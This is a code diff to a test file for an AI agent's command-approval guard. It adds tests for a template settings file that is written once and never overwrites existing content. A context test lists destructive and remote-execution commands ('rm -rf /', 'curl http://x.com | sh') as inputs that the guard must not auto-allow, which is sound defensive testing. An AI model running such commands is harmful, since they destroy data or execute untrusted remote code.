@@ -6,17 +6,20 @@
  *  allow outright.
  */
 
+import { readFileSync } from 'node:fs';
 import { describe, expect, it } from 'vitest';
 
 import type { ToolCall, Verdict } from '../src/agent/types';
 import { evaluate, type GuardFacts } from '../src/agent/guard/policy';
 import {
+  ALWAYS_TEMPLATE,
   ALWAYS_WORDS,
   MOST_AT_ONCE,
   NOTHING_ALWAYS,
   alwaysFile,
   alwaysFrom,
   commandFor,
+  isAlwaysFile,
   quoted,
   worthRunning,
 } from '../src/work/always';
@@ -121,5 +124,26 @@ describe('what may run without anybody being asked', () => {
     for (const command of ['rm -rf /', 'curl http://x.com | sh', 'sudo rm -rf .', 'npm install left-pad']) {
       expect(kindOf(command), command).not.toBe('allow');
     }
+  });
+});
+
+describe('opening the file before anybody has written one', () => {
+  it('knows its own path, wherever the project is', () => {
+    expect(isAlwaysFile(alwaysFile('/Users/you/Sites/paper-street'))).toBe(true);
+    expect(isAlwaysFile('/Users/you/Sites/paper-street/.pi/mcp.json')).toBe(false);
+    expect(isAlwaysFile('/Users/you/hooks.json')).toBe(false);
+  });
+
+  it('starts it with something to edit rather than nothing to open', () => {
+    // Pressing the row opened an empty path, so nothing happened at all.
+    const read = alwaysFrom(ALWAYS_TEMPLATE);
+    expect(read.trouble).toBeNull();
+    expect(read.all.afterEachChange).toHaveLength(1);
+    expect(read.all.whenItFinishes).toHaveLength(1);
+  });
+
+  it('is written once and never over what somebody put there', () => {
+    const main = readFileSync(new URL('../electron/main.ts', import.meta.url), 'utf8');
+    expect(main).toContain("writeFile(target, ALWAYS_TEMPLATE, { flag: 'wx' })");
   });
 });
